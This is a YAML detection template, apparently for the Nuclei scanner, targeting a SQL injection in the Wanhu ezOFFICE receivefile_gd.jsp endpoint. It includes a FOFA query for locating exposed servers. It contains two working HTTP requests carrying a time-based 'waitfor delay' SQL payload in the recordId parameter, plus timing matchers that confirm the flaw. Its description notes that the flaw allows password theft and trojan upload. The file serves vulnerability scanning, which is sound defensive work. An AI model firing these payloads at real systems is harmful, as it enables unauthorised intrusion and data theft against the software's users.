id: wanhu-ezOFFICE-receivefile_gd-sql

info:
  name: 万户 ezOFFICE receivefile_gd.jsp SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="万户ezOFFICE协同管理平台"
    万户 ezOFFICE receivefile_gd.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486768&idx=1&sn=677f93034a08a4c6757794e2f29dc145&chksm=c267b803f5103115b6c339e01c4d43241f0a440860fb756d86b7d278f850cc741e9a3e8ae842&token=522460222&lang=zh_CN#rd
  tags: sql injection


http:
  - raw:
      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:4'--+- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

      - |
        GET /defaultroot/modules/govoffice/gov_documentmanager/receivefile_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:8'--+- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0

    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and



